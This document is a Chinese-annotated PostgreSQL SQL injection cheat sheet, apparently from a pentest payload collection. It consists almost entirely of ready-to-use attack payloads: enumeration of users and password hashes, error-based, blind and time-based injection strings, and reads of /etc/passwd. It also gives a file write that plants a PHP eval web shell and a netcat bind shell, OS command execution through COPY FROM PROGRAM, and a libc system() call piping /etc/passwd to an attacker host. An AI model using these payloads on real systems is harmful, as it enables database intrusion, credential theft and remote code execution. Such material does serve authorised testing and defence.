  ##### 注释符
  	--
	/**/  
  ##### 版本
  	SELECT version()
  ##### 当前用户
	SELECT user;
	SELECT current_user;
	SELECT session_user;
	SELECT usename FROM pg_user;
	SELECT getpgusername();
  ##### 列出用户
	SELECT usename FROM pg_user
  ##### 列出密码哈希
	SELECT usename, passwd FROM pg_shadow 
  ##### 列出数据库管理员帐户
	SELECT usename FROM pg_user WHERE usesuper IS TRUE
  ##### 列出权限
	SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
  ##### 检查当前用户是否为超级用户
	SHOW is_superuser; 
	SELECT current_setting('is_superuser');
	SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
  ##### 数据库名
	SELECT current_database()
  ##### 列出数据库
	SELECT datname FROM pg_database
  ##### 列出表
	SELECT table_name FROM information_schema.tables
  ##### 列出字段
	SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
  ##### 基于报错类型
	,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
	,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
	,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
	,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)

	' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
	' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
	' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
	' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
	XML Helper
	select query_to_xml('select * from pg_user',true,true,''); -- 将所有结果作为单行xml 返回
	select database_to_xml(true,true,''); -- 以XML形式列出当前数据库
	select database_to_xmlschema(true,true,''); -- 以XML schema形式列出当前数据库
  ##### 盲注
	' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK
	' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO
  ##### 基于时间盲注
	AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
	AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
  ##### 堆查询
	使用分号“;” 添加另一个查询
	http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--
  ##### 读取文件
	select pg_ls_dir('./');
	select pg_read_file('PG_VERSION', 0, 200);
	select pg_read_file('postgresql.auto.conf',0,100);  行数
	早期版本不接受pg_read_file或pg_ls_dir中的绝对路径，新版本允许超管和在default_role_read_server_files组的用户读文件
	CREATE TABLE temp(t TEXT);
	COPY temp FROM '/etc/passwd';
	SELECT * FROM temp limit 1 offset 0;

	SELECT lo_import('/etc/passwd');
	SELECT lo_get(16420);
	SELECT * from pg_largeobject;
  ##### 列目录
  	select pg_ls_dir('/etc');
  ##### 写文件
	CREATE TABLE pentestlab (t TEXT);
	INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
	insert into shell values($$<?php @eval($_POST[1]);?>$$);
	SELECT * FROM pentestlab;
	COPY pentestlab(t) TO '/tmp/pentestlab';
	或
	COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
	copy (select '<?php phpinfo();?>') to '/var/www/html/shell.php';

	SELECT lo_from_bytea(43210, 'your file data goes in here');
	SELECT lo_put(43210, 20, 'some other data'); 
	SELECT lo_export(43210, '/tmp/testexport'); 
  ##### 命令执行
	CVE-2019–9193
	DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
	CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
	COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
	SELECT * FROM cmd_exec;                 -- [Optional] View the results
	DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
	使用 libc.so.6
	CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
	SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
  ##### bypass 过滤器
	使用 CHR
	SELECT CHR(65)||CHR(66)||CHR(67);
	版本>8 PostgreSQL使用$符合
	SELECT $$This is a string$$
	SELECT $TAG$This is another string$TAG$